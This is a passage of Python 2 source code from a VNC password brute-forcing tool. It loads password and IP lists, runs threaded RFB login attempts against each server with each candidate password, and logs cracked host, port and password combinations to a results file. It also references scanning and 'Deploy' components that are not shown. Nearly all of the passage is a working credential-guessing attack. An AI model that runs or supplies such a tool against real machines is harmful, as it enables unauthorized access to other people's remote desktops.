				stdout.write("\n\nDONE! Check \"output/results.txt\" or type \"show results\"!\n\n")
			else:
				stdout.write("\n\tThere are no scanned ips.\n")
		else:
			stdout.write("\n\tThere are no passwords.\n")

	def brute_thread(self, server, password):
		try:
			rfb = RFBProtocol(server[0], password, server[1], CONFIG['brute_timeout'])
			rfb.connect()
			rfb.close()
			lock.acquire()
			if rfb.RFB:
				if rfb.connected:
					self.servers.pop(self.servers.index(server))
					if rfb.null:
						password = "null"
					self.results.write("%s:%i-%s-[%s]\n" % (str(server[0]), int(server[1]), password, rfb.name))
					stdout.flush()
					stdout.write("\r[*] %s:%i - %s              \n\n" % (str(server[0]), int(server[1]), password))
			lock.release()
		except KeyboardInterrupt:
			return
		except:
			pass
		semaphore.release()

	def output_thread(self):
		while not self.output_kill:
			try:
				if self.current_password != None:
					stdout.flush()
					stdout.write("\r Trying \"%s\" on %i servers    " % (self.current_password, len(self.servers)))
					time.sleep(0.2)
			except:
				pass

	def get_passwords(self):
		if not Files.file_empty(FILES['passwords']):
			for line in open(FILES['passwords'], 'r').readlines():
				if line.strip != "":
					self.passwords.append(line.strip())
		else:
			self.passwords = False

	def get_servers(self):
		if not Files.file_empty(FILES['ips']):
			for line in open(FILES['ips'], 'r').readlines():
				if line.count(":") == 1:
					line = line.strip().split(":")
					if NetTools.is_ip(line[0]) and Misc.is_int(line[1]):
						self.servers.append([line[0], int(line[1])])
				elif NetTools.is_ip(line.strip()):
					self.servers.append([line.strip(), CONFIG['scan_port']])
		else:
			self.servers = False

class MainEngine:

	def __init__(self):
		global Files, NetTools, Deploy, Display, Interface, ScanEngine, BruteEngine, Misc
		Files = FilesHandler()
		NetTools = NetTools()
		Deploy = Deploy()
		Misc = MiscFunctions()
		Display = Display()
		ScanEngine = ScanEngine()
		BruteEngine = BruteEngine()
		Interface = Interface()

	def Start(self):
		self.load_config()
		Display.clearscreen()
		Interface.Start()

	def load_config(self):
		global CONFIG
		CONFIG = pickle.load(open(FILES['config']))

if __name__ == "__main__":
	try:
		MainEngine = MainEngine()
		MainEngine.Start()
	except KeyboardInterrupt:
		if CONFIG['auto_save'] == "true":
			Misc.save_config()
		sys.exit("\n\n\t...Exiting...\n")
